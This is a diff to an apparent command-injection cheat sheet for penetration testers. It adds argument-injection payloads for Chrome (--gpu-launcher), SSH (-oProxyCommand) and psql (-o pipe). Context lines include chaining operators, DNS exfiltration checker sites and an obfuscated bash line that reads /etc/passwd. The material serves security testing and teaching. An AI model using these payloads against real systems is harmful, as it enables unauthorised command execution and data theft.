@@ -8,6 +8,7 @@
 * [Exploits](#exploits)
   * [Basic commands](#basic-commands)
   * [Chaining commands](#chaining-commands)
+  * [Argument injection](#argument-injection)
   * [Inside a command](#inside-a-command)
 * [Filter Bypasses](#filter-bypasses)
   * [Bypass without space](#bypass-without-space)
@@ -25,7 +26,7 @@
 * [Data Exfiltration](#data-exfiltration)
   * [Time based data exfiltration](#time-based-data-exfiltration)
   * [DNS based data exfiltration](#dns-based-data-exfiltration)
-* [Polyglot command injection](#polyglot-command-injection)
+* [Polyglot Command Injection](#polyglot-command-injection)
 * [Tricks](#tricks)
   * [Backgrounding long running commands](#backgrounding-long-running-commands)
   * [Remove arguments after the injection](#remove-arguments-after-the-injection)
@@ -95,6 +96,27 @@ command1 || command2 # Execute command2 only if command1 fails
 command1 & command2  # Execute command1 in the background
 command1 | command2  # Pipe the output of command1 into command2
 ```
+
+
+### Argument Injection
+
+Gain a command execution when you can only append arguments to an existing command.
+Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.
+
+* Chrome
+    ```ps1
+    chrome '--gpu-launcher="id>/tmp/foo"'
+    ```
+
+* SSH
+    ```ps1
+    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
+    ```
+
+* psql
+    ```ps1
+    psql -o'|id>/tmp/foo'
+    ```
 
 
 ### Inside a command
@@ -312,7 +334,7 @@ Online tools to check for DNS based data exfiltration:
 - pingb.in
 
 
-## Polyglot command injection
+## Polyglot Command Injection
 
 A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.
 
@@ -377,3 +399,4 @@ g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 * [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
 * [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
 * [What is OS command injection - portswigger](https://portswigger.net/web-security/os-command-injection)
+* [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/)
